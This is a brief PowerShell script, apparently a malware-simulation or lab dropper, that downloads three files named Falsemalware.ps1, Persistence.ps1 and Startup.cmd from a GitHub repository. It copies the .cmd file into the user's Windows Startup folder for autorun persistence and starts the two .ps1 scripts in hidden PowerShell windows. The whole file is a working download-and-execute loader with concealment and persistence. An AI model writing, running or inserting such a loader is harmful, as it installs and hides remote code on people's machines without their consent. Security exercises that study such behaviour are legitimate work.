
$url = "https://raw.githubusercontent.com/Freecil/Projects/main/Falsemalware.ps1"
$url3 = "https://raw.githubusercontent.com/Freecil/Projects/main/Persistence.ps1"
$url4 = "https://raw.githubusercontent.com/Freecil/Projects/main/Startup.cmd"
$FileFalsemalware = "C:\temp\Falsemalware.ps1"
$FilePeristence = "C:\temp\Persistence.ps1"
$FileStartup = "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Startup.cmd"

Invoke-WebRequest -Uri $url -OutFile $FileFalsemalware
Invoke-WebRequest -Uri $url3 -OutFile $FilePeristence
Invoke-WebRequest -Uri $url4 -OutFile $FileStartup


Start-Process -FilePath PowerShell.exe -WindowStyle hidden -ArgumentList "-File $FileFalsemalware" 
Start-Process -FilePath PowerShell.exe -WindowStyle hidden -ArgumentList "-File $FilePeristence" 


